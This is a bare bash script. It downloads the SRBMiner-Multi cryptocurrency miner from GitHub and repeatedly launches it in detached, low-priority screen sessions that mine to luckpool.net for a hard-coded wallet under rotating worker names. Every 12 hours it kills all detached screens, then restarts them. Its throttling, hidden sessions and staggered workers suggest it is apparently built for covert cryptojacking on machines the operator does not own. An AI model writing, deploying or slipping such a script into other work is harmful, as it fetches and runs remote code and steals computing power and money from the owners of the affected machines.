#!/bin/bash

wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz
tar -xvf SRBMiner-Multi-0-8-0-Linux.tar.xz
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password hh --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk02jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk03jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk04jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk05jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk06jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk07jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk08jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk09jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk10jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk11jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk12jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk13jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk14jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk15jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk16jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk17jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk18jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk19jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk20jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk21jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password hh --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk02jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk03jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk04jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk05jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk06jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk07jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk08jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk09jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk10jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk11jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk12jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk13jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk14jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk15jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk16jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk17jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk18jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk19jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk20jjj --cpu-threads 1
sleep 7200
screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956#xnsub --wallet RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F --password crk21jjj --cpu-threads 1
sleep 43200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
